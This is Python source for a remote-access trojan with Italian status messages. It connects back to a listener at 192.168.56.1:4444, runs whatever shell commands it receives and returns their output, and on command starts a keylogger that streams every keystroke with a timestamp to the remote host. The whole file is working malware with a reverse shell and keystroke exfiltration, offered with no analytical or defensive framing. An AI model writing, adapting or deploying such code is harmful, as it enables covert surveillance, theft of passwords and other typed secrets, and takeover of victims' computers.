import socket
import subprocess
import os
import datetime
from pynput.keyboard import Key, Listener
import threading
from threading import *
host="192.168.56.1"
port=4444
buffersize=8000
def client():
    global conn
    conn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((host, port))
    recv()
def keylogger():
    with Listener(on_press=press, on_release=release)as listener:
        listener.join()
def press(key):
    now=datetime.datetime.now()
    strnow=str(now)
    strkey=str(key)
    if keystop==False:
               
        message=strkey+"premuto"+"["+strnow+"]"
        conn.send(message.encode())
    else:
        return False
def release(key):
    pass
def recv():
    global keystop
    keystop=False
    while True:
        data=conn.recv(buffersize)
        if data.decode()=="keylogger":
            x=threading.Thread(target=keylogger)
            y=threading.Thread(target=recv)
            x.start()
            y.start()

        elif data.decode()=="keystop":
            keystop=not keystop
        else:
            command=subprocess.run(data.decode(), shell=True, capture_output=True)
            output=command.stdout+command.stderr
            if output:
                conn.send(output)
            else:
                conn.send("comando eseguito con succeso, ma senza output".encode())
            conn.send(output)
def main():
    client()
    recv()
if  __name__=="__main__":
    main()
